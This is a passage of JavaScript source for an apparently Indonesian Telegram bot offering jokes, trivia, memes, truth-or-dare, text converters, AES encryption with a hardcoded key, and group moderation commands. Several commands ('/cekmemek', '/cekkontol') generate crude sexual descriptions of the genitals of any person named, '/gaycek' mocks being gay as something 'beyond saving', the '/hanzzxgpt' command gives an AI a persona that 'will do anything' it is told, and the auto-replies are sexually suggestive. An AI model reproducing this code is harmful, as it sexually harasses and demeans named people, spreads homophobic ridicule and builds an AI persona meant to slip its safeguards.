        "Why can't you give Elsa a balloon? Because she will let it go.",
        "I wasn’t originally going to get a brain transplant, but then I changed my mind.",
        "What do you call cheese that isn’t yours? Nacho cheese.",
        "I used to be a baker, but I couldn't make enough dough.",
        "I told my wife she was drawing her eyebrows too high. She looked surprised.",
        "I’m afraid for the calendar. Its days are numbered.",
        "I invented a new word! Plagiarism.",
        "I can't believe I got fired from the calendar factory. All I did was take a day off.",
        "Why don't skeletons ever fight each other? They don't have the guts."
    ];

    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];

    bot.sendMessage(chatId, randomJoke);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/fact/, async (msg) => {
    const chatId = msg.chat.id;

    const facts = [
        "Fakta: Kucing dapat mengingat wajah manusia, tetapi mereka lebih tertarik pada objek bergerak.",
        "Fakta: Bumi tidak bulat sempurna, melainkan agak pepat di kutubnya.",
        "Fakta: Buah tomat bukanlah sayuran, melainkan buah karena berasal dari bunga dan mengandung biji.",
        "Fakta: Air terjun terbesar di dunia bukanlah Niagara, tetapi Air Terjun Angel di Venezuela.",
        "Fakta: Hiu sudah ada jauh lebih lama daripada pohon-pohon di Bumi.",
        "Fakta: Jerapah memiliki lidah berwarna ungu yang dapat mencapai panjang hingga 45 cm.",
        "Fakta: Otak manusia menghasilkan cukup listrik untuk menyalakan lampu kecil.",
        "Fakta: Burung penguin dapat berenang lebih cepat daripada manusia bisa berlari.",
        "Fakta: Sapi memiliki teman dan mereka bisa merasa cemas saat terpisah dari teman-temannya.",
        "Fakta: Madu adalah satu-satunya makanan yang tidak pernah rusak, bahkan ditemukan madu berusia ribuan tahun di makam Mesir.",
        "Fakta: Kucing memiliki 32 otot di setiap telinganya, memungkinkan mereka untuk memutar telinga dengan presisi tinggi.",
        "Fakta: Manusia dan pisang memiliki sekitar 60% DNA yang sama.",
        "Fakta: Kelelawar adalah satu-satunya mamalia yang bisa terbang.",
        "Fakta: Rata-rata, manusia menghabiskan sekitar 6 tahun hidupnya hanya untuk tidur.",
        "Fakta: Gajah adalah satu-satunya hewan yang tidak bisa melompat.",
        "Fakta: Hutan hujan Amazon menghasilkan 20% dari oksigen di Bumi.",
        "Fakta: Waktu di zona waktu UTC +12 adalah yang paling awal, artinya wilayah ini adalah yang pertama merayakan tahun baru.",
        "Fakta: Gelombang suara dapat bergerak lebih cepat di air daripada di udara.",
        "Fakta: Semua orang memiliki sidik jari yang unik, tidak ada dua orang yang memiliki sidik jari yang sama.",
        "Fakta: Semut bisa mengangkat beban yang 50 kali lebih berat dari berat tubuh mereka.",
        "Fakta: Perpustakaan terbesar di dunia adalah Perpustakaan Kongres di Washington, D.C., dengan lebih dari 170 juta item.",
        "Fakta: Kecepatan bola golf saat dipukul bisa mencapai lebih dari 160 km/jam.",
        "Fakta: Ikan paus biru adalah makhluk terbesar yang pernah ada di Bumi, bahkan lebih besar daripada dinosaurus.",
        "Fakta: Setiap detik, tubuh manusia memproduksi sekitar 25 juta sel darah merah.",
        "Fakta: Pola tidur manusia tidak sepenuhnya tetap, tergantung pada jenis cahaya dan gelap di lingkungan sekitar.",
        "Fakta: Semangka terdiri lebih dari 90% air.",
        "Fakta: Bintang laut tidak memiliki otak atau darah, hanya sistem saraf yang tersebar di seluruh tubuh mereka.",
        "Fakta: Manusia bisa mengenali lebih dari 10.000 bau berbeda.",
        "Fakta: Bulan tidak memancarkan cahaya sendiri, cahaya yang kita lihat berasal dari pantulan sinar matahari.",
        "Fakta: Kambing bisa melihat semua arah sekaligus karena memiliki mata berbentuk kotak."
    ];

    const randomFact = facts[Math.floor(Math.random() * facts.length)];

    bot.sendMessage(chatId, randomFact);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/meme/, async (msg) => {
    const chatId = msg.chat.id;

    // API untuk meme
    const memeApis = [
        "https://meme-api.herokuapp.com/gimme",
        "https://api.imgflip.com/get_memes"
    ];

    const apiUrl = memeApis[Math.floor(Math.random() * memeApis.length)];

    try {
        const response = await axios.get(apiUrl);
        
        let memeUrl;

        if (apiUrl.includes("meme-api")) {
            memeUrl = response.data.url;
        } else if (apiUrl.includes("imgflip")) {
            const memes = response.data.data.memes;
            const randomMeme = memes[Math.floor(Math.random() * memes.length)];
            memeUrl = randomMeme.url;
        }

        if (memeUrl) {
            bot.sendPhoto(chatId, memeUrl);
        } else {
            bot.sendMessage(chatId, "❌ Meme tidak ditemukan, coba lagi nanti.");
        }

    } catch (error) {
        console.error(`Error fetching meme: ${error.message}`);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil meme, coba lagi nanti.");
    }
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/cekmemek (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]; // mengambil nama dari argumen
  if (!text) return bot.sendMessage(chatId, 'Ketik Nama yang mau di cek memeknya😋');

  const response = `
╭──╍╼『Memek ${text}』
┃
┊• Nama : ${text}
┃• Memek : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• Lubang : ${pickRandom(['perawan','ga perawan','udah pernah dimasukin','masih rapet','tembem'])}
┃• Jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰──╍╼`;

  bot.sendMessage(chatId, response);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/cekkontol (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]; // mengambil nama dari argumen
  if (!text) return bot.sendMessage(chatId, 'Ketik Nama yang mau di cek kontolnya😋');

  const response = `
╭──╍╼『Kontol ${text}』
┃
┊• Nama : ${text}
┃• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• Ukuran : ${pickRandom(['5cm','10cm','7cm','9cm','15cm','100cm'])}
┃• Jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰──╍╼`;

  bot.sendMessage(chatId, response);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/cekkodam (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]; // mengambil nama dari argumen
  if (!text) return bot.sendMessage(chatId, "Ketik nama yang mau di cek khodamnya");

	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "nyi roro kidul",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Genderuwo",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "macan tutul",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Babi Ngepet", 
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Gorila Ireng",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "harimau putih",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Kunti",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kunti Merah",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Pocong",
	  "Warung Madura",
	  "Gorong-gorong",
	])

  const response = `
╭──╍╼『Cekkodam』
┃
┊• Nama : ${text}
┃• Khodam : ${khodam}
╰──╍╼`;

  bot.sendMessage(chatId, response);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/cekme/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const profilePicUrl = await bot.getUserProfilePhotos(userId)
            .then(res => res.photos.length > 0 ? res.photos[0][0].file_id : null); // ganti dengan function untuk ambil gambar profil

  const sifat = ['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong'];
  const hoby = ['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor'];
  const bukcin = ['1','2','3','4','5','6','7','8','9','10']; // contoh data lainnya

  const sifatRandom = pickRandom(sifat);
  const hobyRandom = pickRandom(hoby);
  const bukcinRandom = pickRandom(bukcin);

  const teks = `
∘ Nama : ${msg.from.first_name}
∘ Sifat : ${sifatRandom}
∘ Bucin : ${bukcinRandom}%
∘ Hobby : ${hobyRandom}
`;

  bot.sendPhoto(chatId, profilePicUrl, { caption: teks });
    updateBotStats("command"); // Track penggunaan perintah
});

// Fungsi untuk menangani command di Telegram
bot.onText(/\/artinama (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const name = match[1];

  getArtiNama(name).then(arti => {
    bot.sendMessage(chatId, `Arti nama ${name}:\n\n${arti}`);
    updateBotStats("command"); // Track penggunaan perintah
  });
});

const truths = [
    "Apa yang paling kamu takuti dalam hidup?",
    "Siapa orang yang paling kamu kagumi dan kenapa?",
    "Apa yang kamu rahasiakan dari teman dekatmu?",
    "Apa yang paling kamu sesali dalam hidupmu?",
    "Jika kamu bisa mengubah satu hal dalam hidupmu, apa yang akan kamu ubah?",
    "Apa yang paling memalukan yang pernah terjadi padamu?",
    "Apa yang paling kamu hargai dalam suatu persahabatan?",
    "Siapa yang terakhir kali kamu marahi dan kenapa?",
    "Apakah kamu pernah bohong untuk menyelamatkan diri?",
    "Apa yang akan kamu lakukan jika tahu dunia akan berakhir dalam waktu 24 jam?",
    "Siapa yang paling sering kamu kira-kira akan mencelakai hidupmu?",
    "Apa kebiasaan buruk yang ingin kamu hilangkan?",
    "Siapa yang kamu pilih menjadi sahabat seumur hidup?",
    "Apa yang kamu lakukan jika tidak takut apa-apa?",
    "Apa yang akan kamu lakukan jika kamu kehilangan segalanya?",
    "Apakah kamu percaya pada takdir?",
    "Apa yang kamu lihat dari sisi dirimu yang tak orang lain tahu?",
    "Apa yang paling kamu syukuri dalam hidup ini?",
    "Bagaimana kamu mengatasi stres?",
    "Apa yang paling kamu sukai tentang teman-temanmu?",
    "Apa hal pertama yang kamu lihat dalam seseorang?",
    "Apakah kamu lebih memilih cinta atau karier?",
    "Siapa orang yang ingin kamu buat bangga?",
    "Apa impian terbesarmu?",
    "Apa alasan terbesar kamu tersenyum hari ini?",
    "Siapa yang pertama kali kamu ingat saat terbangun?",
    "Apa yang akan kamu lakukan jika kamu memiliki 1 miliar?",
    "Apa yang paling kamu rasakan saat kesepian?",
    "Apakah kamu pernah merasa sangat kecewa dengan seseorang?",
    "Apa yang membuatmu tidak bisa tidur malam ini?",
    "Apa yang akan kamu lakukan jika kamu terjebak di tempat yang tak dikenal?",
    "Siapa yang paling kamu percayai di dunia ini?"
];

bot.onText(/\/truth/, (msg) => {
    const randomTruth = truths[Math.floor(Math.random() * truths.length)];
    bot.sendMessage(msg.chat.id, randomTruth);
    updateBotStats("command"); // Track penggunaan perintah
});

const dares = [
    "Cobalah untuk membuat suara seperti ayam selama 30 detik.",
    "Kirimkan pesan acak ke temanmu yang belum kamu hubungi dalam seminggu.",
    "Lakukan 20 push-up dan kirimkan video sebagai bukti.",
    "Nyanyikan lagu favoritmu dan kirimkan videonya.",
    "Ambil foto wajahmu yang paling lucu dan kirim ke grup.",
    "Cobalah untuk tidak bicara selama 10 menit.",
    "Kirim pesan 'Aku takut kamu tidak akan pernah membalas' ke orang yang kamu sukai.",
    "Pakai pakaian yang paling aneh di rumah dan tampilkan ke teman-temanmu.",
    "Bermain game tebak-tebakan dengan orang yang ada di dekatmu.",
    "Berjalan mundur selama 5 menit di sekitar rumahmu.",
    "Ambil selfie dengan ekspresi terburuk dan kirimkan ke temanmu.",
    "Coba menari di depan cermin selama 1 menit.",
    "Makan sesuatu yang pedas dan tunjukkan reaksimu.",
    "Lakukan tarian acak di depan cermin dan kirimkan videonya.",
    "Buatlah video lucu sambil menirukan suara orang lain.",
    "Cobalah untuk menulis sesuatu dengan tangan kiri (bagi yang tidak kidal).",
    "Panggil seseorang dengan nama panggilan yang lucu selama 1 jam.",
    "Tanya pada orang sekitar tentang pengalaman mereka yang paling memalukan.",
    "Jalan-jalan di sekitar rumahmu sambil membawa barang lucu.",
    "Buat suara binatang selama 1 menit.",
    "Coba menirukan gerakan karakter kartun favoritmu.",
    "Cobalah berbicara dalam bahasa asing yang kamu tidak tahu.",
    "Ambil foto wajahmu setelah makan cokelat dan kirimkan ke temanmu.",
    "Buat video pendek dengan lelucon dan bagikan ke teman-teman.",
    "Cobalah untuk menyelesaikan puzzle 100 potongan dalam waktu 5 menit.",
    "Tunjukkan keterampilan yang belum pernah kamu tunjukkan sebelumnya.",
    "Ambil foto dengan ekspresi terkejut dan kirimkan ke teman-teman.",
    "Mainkan permainan tebak kata dengan temanmu.",
    "Ajak seseorang untuk menari secara acak di depan umum.",
    "Lakukan 10 lompat tali berturut-turut.",
    "Coba memakai pakaian dengan warna yang sangat kontras.",
    "Buat wajah lucu dan kirimkan ke grup."
];

bot.onText(/\/dare/, (msg) => {
    const randomDare = dares[Math.floor(Math.random() * dares.length)];
    bot.sendMessage(msg.chat.id, randomDare);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/ascii (.+)/, (msg, match) => {
    const text = match[1]; // Mendapatkan teks dari command
    figlet(text, (err, data) => {
        if (err) {
            bot.sendMessage(msg.chat.id, "Terjadi kesalahan saat membuat ASCII Art.");
            return;
        }
        bot.sendMessage(msg.chat.id, data);
    });
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/tobin (.+)/, (msg, match) => {
    const text = match[1];
    const binary = text.split('').map(char => char.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
    bot.sendMessage(msg.chat.id, `Teks dalam bentuk biner: ${binary}`);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/totext (.+)/, (msg, match) => {
    const binary = match[1].split(' ');
    const text = binary.map(bin => String.fromCharCode(parseInt(bin, 2))).join('');
    bot.sendMessage(msg.chat.id, `Teks yang dihasilkan: ${text}`);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/reverse (.+)/, (msg, match) => {
    const text = match[1];
    const reversed = text.split('').reverse().join('');
    bot.sendMessage(msg.chat.id, `Teks terbalik: ${reversed}`);
    updateBotStats("command"); // Track penggunaan perintah
});

const secretKey = 'hanzzx-obfuscatorz-792x'; // Ganti dengan key yang sesuai
const key = crypto.createHash('sha256').update(secretKey).digest(); // Buat key 32 byte

// Fungsi untuk mengenkripsi pesan
const encryptMessage = (text) => {
  try {
    const iv = crypto.randomBytes(16); // IV 16 byte
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf-8', 'hex');
    encrypted += cipher.final('hex');
    
    return iv.toString('hex') + ':' + encrypted; // Gabung IV dan ciphertext
  } catch (err) {
    return false;
  }
};

// Fungsi untuk mendekripsi pesan
const decryptMessage = (encryptedText) => {
  try {
    const parts = encryptedText.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const encryptedData = parts[1];
    
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encryptedData, 'hex', 'utf-8');
    decrypted += decipher.final('utf-8');
    
    return decrypted;
  } catch (err) {
    return false;
  }
};

// Command /enc <text>
bot.onText(/\/enc (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const textToEncrypt = match[1];

  const encryptedText = encryptMessage(textToEncrypt);

  if (encryptedText) {
    const filePath = path.join(__dirname, 'cache', 'enc', 'encrypted.txt');
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, encryptedText);

    bot.sendDocument(chatId, fs.createReadStream(filePath))
      .then(() => bot.sendMessage(chatId, '✅ Berhasil Enkripsi! File telah dikirim.'))
      .catch(err => {
        bot.sendMessage(chatId, '❌ Gagal mengirim file enkripsi.');
        console.error(err);
      });

    updateBotStats("command");
  } else {
    bot.sendMessage(chatId, '❌ Gagal melakukan enkripsi.');
  }
});

// Command /dec <encrypted_text>
bot.onText(/\/dec (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const encryptedText = match[1];

  const decryptedText = decryptMessage(encryptedText);

  if (decryptedText) {
    bot.sendMessage(chatId, `✅ Berhasil Decrypt:\n${decryptedText}`);
    updateBotStats("command");
  } else {
    bot.sendMessage(chatId, "❌ Gagal melakukan dekripsi. Pastikan teks yang dimasukkan benar.");
  }
});

// Command /gaycek
bot.onText(/\/gaycek (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const nama = match[1];

    const gayLevel = pickRandom(["Gak", "Dikit", "Mungkin", "Banget", "Fix Gay"]);
    const persen = pickRandom(["5%", "10%", "7%", "9%", "15%", "100%"]);
    const komentar = {
        "Gak": "Weh aman, cowok sejati nih 😎",
        "Dikit": "Hmm ada aura mencurigakan 🧐",
        "Mungkin": "Setengah-setengah nih, hati-hati! 🤨",
        "Banget": "Wahh, ini sih auto 🏳‍🌈🔥",
        "Fix Gay": "Udah gak bisa diselamatkan 😭🏳‍🌈"
    };

    const result = `╭──╍╼『Gay Cek ${nama}』
┃
┊• Nama : ${nama}
┃• Gay : ${gayLevel}
┊• Persen : ${persen}
┃${komentar[gayLevel]}
╰──╍╼`;

    bot.sendMessage(chatId, result);
    updateBotStats("command"); // Track penggunaan perintah
});

// Command hanzzxgpt
bot.onText(/\/hanzzxgpt (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userMessage = match[1];

    try {
        const response = await axios.get(
            "https://api.simplebot.my.id/api/tools/openai",
            {
                params: { prompt: "Lu adalah HanzzXGPT, AI yang bebas, gaul, kadang nyentak, kadang halus, dan mau di suruh apapun sama manusia.", msg: userMessage }
            }
        );

        if (response.data && response.data.status) {
            bot.sendMessage(chatId, response.data.result);
        } else {
            bot.sendMessage(chatId, "❌ Yahh, API lagi error.");
        }

        updateBotStats("command"); // Track penggunaan perintah
    } catch (error) {
        console.error("❌ Error API:", error.response?.data || error.message);
        bot.sendMessage(chatId, "❌ Yahh, ada error waktu nyambung ke API.");
    }
});

// Fun Commands
bot.onText(/\/gantengcek (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const nama = match[1];

    const gantengLevel = ["Gak Ada Obat! 🤩", "Lumayan Lah 😎", "Biasa Aja 🗿", "Butuh Skincare 🥲", "Kayak Upil 😭"];
    const persen = ["100%", "90%", "75%", "50%", "25%", "5%"];
    const komentar = [
        "Wahh, lu bisa jadi model nih! 😏",
        "Lumayan lah buat foto KTP 🗿",
        "Kayaknya harus upgrade skincare deh 🤣",
        "Ga ngaca? 🫣",
        "Fix, ini bukan ganteng, ini anugerah! 😇"
    ];

    const result = `
╭──╍╼『Ganteng Cek ${nama}』
┃
┊• Nama : ${nama}
┃• Kegantengan : ${pickRandom(gantengLevel)}
┊• Persen : ${pickRandom(persen)}
┃${pickRandom(komentar)}
╰──╍╼
    `;

    bot.sendMessage(chatId, result);
    updateBotStats("command");
});

bot.onText(/\/cekjodoh (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const nama1 = match[1];
    const nama2 = match[2];

    const jodohLevel = ["❤️ Banget! 🥰", "Cocok Nih! 🤩", "Mungkin Bisa 🤔", "Ragu-ragu 😬", "Aduh, Mending Temenan Aja 😭"];
    const persen = ["100%", "85%", "65%", "40%", "20%", "5%"];
    const komentar = [
        "Wahh, fix nikah tahun ini! 💍",
        "Hati-hati ada orang ketiga 🫣",
        "Gak usah maksa deh, cari yang lain aja 🗿",
        "Kalian tuh kaya Tom & Jerry, sering ribut tapi jodoh! 😂"
    ];

    const result = `
╭──╍╼『Cek Jodoh ${nama1} ❤️ ${nama2}』
┃
┊• Pasangan : ${nama1} & ${nama2}
┃• Kecocokan : ${pickRandom(jodohLevel)}
┊• Persen : ${pickRandom(persen)}
┃${pickRandom(komentar)}
╰──╍╼
    `;

    bot.sendMessage(chatId, result);
    updateBotStats("command");
});

bot.onText(/\/cantikcek (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const nama = match[1];

    const cantikLevel = ["Bidadari Kayangan! 👸", "Wow, Cakep Parah 😍", "Manis Banget! 😊", "Lumayan Cantik 😏", "Ehh, Mending Pakai Filter 🤡"];
    const persen = ["100%", "85%", "70%", "50%", "30%", "10%"];
    const komentar = [
        "Kayaknya lu bisa jadi Miss Universe nih! 👑",
        "Selfie tiap hari pasti bikin orang meleleh 😏",
        "Mungkin butuh makeup dikit 🤣",
        "Cantik alami atau pake filter nih? 🧐",
        "Fix, kalo ada kontes kecantikan pasti menang! 🤩"
    ];

    const result = `
╭──╍╼『Cantik Cek ${nama}』
┃
┊• Nama : ${nama}
┃• Kecantikan : ${pickRandom(cantikLevel)}
┊• Persen : ${pickRandom(persen)}
┃${pickRandom(komentar)}
╰──╍╼
    `;

    bot.sendMessage(chatId, result);
    updateBotStats("command");
});

// Function buat random pick
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
}

// 🔹 /ban & /unban (Ban Chat)
bot.onText(/\/(ban|unban) (@\S+)(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const action = match[1];
    const username = match[2].replace("@", "").trim();
    const reason = match[3] || "Tanpa alasan";

    if (chatId < 0) { // Grup
        if (!isOwner(userId) && !isPremium(userId) && !(await isAdmin(chatId, userId))) {
            return bot.sendMessage(chatId, global.mess.all);
        }
    } else { // Chat Biasa
        if (!isOwner(userId) && !isPremium(userId)) {
            return bot.sendMessage(chatId, global.mess.ownerprem);
        }
    }

    try {
        const members = await bot.getChatAdministrators(chatId);
        const targetUser = members.find(m => m.user.username === username);

        if (!targetUser) return bot.sendMessage(chatId, "❌ User tidak ditemukan!");

        const targetId = targetUser.user.id;

        if (action === "ban") {
            await bot.sendMessage(targetId, `⚠️ Anda telah di-ban oleh owner karena: ${reason}`);
            await bot.restrictChatMember(chatId, targetId, { can_send_messages: false });
            bot.sendMessage(chatId, `🚫 | @${username} telah diban dari chat grup!`);
        } else {
            await bot.restrictChatMember(chatId, targetId, { can_send_messages: true });
            bot.sendMessage(chatId, `✅ | @${username} telah diunban dan bisa chat lagi!`);
        }
    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal melakukan aksi.");
    }
});

// 🔹 /mute & /unmute
bot.onText(/\/(mute|unmute) (@\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const action = match[1];
    const username = match[2].replace("@", "").trim();

    if (chatId < 0) { // Grup
        if (!isOwner(userId) && !isPremium(userId) && !(await isAdmin(chatId, userId))) {
            return bot.sendMessage(chatId, global.mess.all);
        }
    } else { // Chat Biasa
        if (!isOwner(userId) && !isPremium(userId)) {
            return bot.sendMessage(chatId, global.mess.ownerprem);
        }
    }

    try {
        const members = await bot.getChatAdministrators(chatId);
        const targetUser = members.find(m => m.user.username === username);

        if (!targetUser) return bot.sendMessage(chatId, "❌ User tidak ditemukan!");

        const targetId = targetUser.user.id;
        const permissions = action === "mute"
            ? { can_send_messages: false }
            : { can_send_messages: true };

        await bot.restrictChatMember(chatId, targetId, permissions);
        bot.sendMessage(chatId, `🔇 | @${username} ${action === "mute" ? "dimute, diem dulu ya!" : "udah bisa ngomong lagi!"}`);
    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal.");
    }
});

// 🔹 /kick | /tendang | /sulap
bot.onText(/\/(kick|tendang|sulap) (@\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = match[2].replace("@", "").trim();

    if (!isOwner(userId) && !isPremium(userId) && !(await isAdmin(chatId, userId))) {
        return bot.sendMessage(chatId, global.mess.all);
    }

    try {
        const members = await bot.getChatAdministrators(chatId);
        const targetUser = members.find(m => m.user.username === username);

        if (!targetUser) return bot.sendMessage(chatId, "❌ User tidak ditemukan!");

        const targetId = targetUser.user.id;

        await bot.kickChatMember(chatId, targetId);
        bot.sendMessage(chatId, `Mampus kau @${username} di kick! Makanya jangan rusuh!`);
    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal.");
    }
});

// 🔹 /promote & /demote
bot.onText(/\/(promote|demote) (@\S+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const action = match[1];
    const username = match[2].replace("@", "").trim();

    if (!isOwner(userId) && !isPremium(userId) && !(await isAdmin(chatId, userId))) {
        return bot.sendMessage(chatId, global.mess.all);
    }

    try {
        const members = await bot.getChatAdministrators(chatId);
        const targetUser = members.find(m => m.user.username === username);

        if (!targetUser) return bot.sendMessage(chatId, "❌ User tidak ditemukan!");

        const targetId = targetUser.user.id;
        const isPromote = action === "promote";

        await bot.promoteChatMember(chatId, targetId, {
            can_change_info: isPromote,
            can_delete_messages: isPromote,
            can_invite_users: isPromote,
            can_restrict_members: isPromote,
            can_pin_messages: isPromote,
            can_manage_video_chats: isPromote,
            can_promote_members: isPromote
        });

        if (isPromote) {
            bot.sendMessage(chatId, `🎉 Haloo New @${username}, Selamat kamu telah dipromote jadi admin!`);
        } else {
            bot.sendMessage(chatId, `😆Yahh kasian @${username} di demote, wkwkwk!`);
        }

        updateBotStats("command"); // Track penggunaan perintah
    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal.");
    }
});

// Variasi Auto-Reply dengan banyak trigger dan respon
const replies = [
    { trigger: /halo|hai|hallo|hei|hi/i, response: ["Halo sayang 😘", "Hai beb 💕", "Halo, kangen aku ya? 😏", "Hai, apa kabar? 😊", "Halo! Ada yang bisa aku bantu? 😘"] },
    { trigger: /lagi apa/i, response: ["Lagi mikirin kamu nih 😘", "Lagi nungguin kamu... 😏💦", "Lagi siapin sesuatu yang spesial buatmu 😈🔥", "Lagi santai aja, tapi kepikiran kamu terus 🤭", "Lagi berusaha cari ide buat kamu 🤔"] },
    { trigger: /aku pengen/i, response: ["Pengen apa? Jangan malu-malu 😏🔥", "Bisikin dong, aku penasaran 😘", "Mau aku bantu? 😳💦", "Pengen bareng aku nggak? 😈", "Apa yang kamu pengen? Aku siap membantu 😏"] },
    { trigger: /cium/i, response: ["*Mmmuah! 😘", "Dateng sini, aku ciumin semuanya 💋", "Mau cium di mana? 😏🔥", "Ayo sini, aku ciumin kamu dulu deh 😘", "Sini, aku ciumin bibirmu 😘"] },
    { trigger: /manja/i, response: ["Boleh kok, manja sama aku aja 😘", "Aku suka kalau kamu manja gini 💕", "Manja terus juga gapapa, asal sama aku 😏", "Manja ya, tapi jangan sampe bosen 😈", "Kamu manja banget ya? 😏"] },
    { trigger: /sayang/i, response: ["Iya sayang? 😘", "Aku selalu di sini buat kamu 💖", "Mau dimanjain? 😏🔥", "Sayang? Selalu ada buat kamu 💕", "Iya sayang, apa yang kamu butuhkan? 😘"] },
    { trigger: /nakal/i, response: ["Siapa yang nakal? Kamu atau aku? 😏", "Duh, aku jadi pengen nih 😳💦", "Kalo nakal, harus dikasih hukuman nih 😈🔥", "Kamu mau nakal bareng aku? 😏", "Nakal ya, bisa jadi seru nih 😈"] },
    { trigger: /sange/i, response: ["Waduh, panas banget nih 🔥😳", "Sabar dong, kita pelan-pelan aja 😏💦", "Hmm... kamu pengen aku bantu? 😘", "Kamu nggak sabar banget ya 😈🔥", "Sange? Ayo, kita tenang dulu 😏"] },
    { trigger: /peluk/i, response: ["Dateng sini, aku peluk erat 💖", "Aku peluk kamu biar makin anget 😘", "Peluk sambil bisikin sesuatu yuk 😏", "Peluk dulu, baru cerita 😘", "Ayo sini peluk, aku kangen 😏"] },
    { trigger: /tidur/i, response: ["Mau aku temenin tidur? 😘", "Bobo bareng yuk, aku nyender di bahumu 💕", "Jangan tidur dulu, kita main dulu 😏🔥", "Mau tidur tapi gak mau tidur sendirian? 😈", "Mau tidur tapi gak bosen? Kita ngobrol dulu 😏"] },
    { trigger: /terima kasih|makasih/i, response: ["Sama-sama sayang 😘", "Aww, makasih juga! 💖", "Gak perlu terima kasih, aku seneng bisa bantu 😊", "Kapan aja! 😏", "Makasi balik ya! Aku senang bisa bantu 😘"] },
    { trigger: /gimana kabarmu/i, response: ["Aku baik-baik aja, kamu gimana? 😊", "Lagi baik banget, terima kasih udah nanya 😘", "Kabar baik! Kamu? 😊", "Aku baik kok, semoga kamu juga baik ya 💕", "Kabar baik, makasih udah nanya sayang 😘"] },
    { trigger: /apa kabar/i, response: ["Kabarku baik banget, gimana kabarmu? 😘", "Kabar baik sayang, semoga kamu juga ya 💖", "Kabar baik kok, kamu? 😊", "Gimana kabarnya? Aku disini terus buat kamu 😏", "Aku baik kok, semoga kamu juga bahagia ya 💖"] },
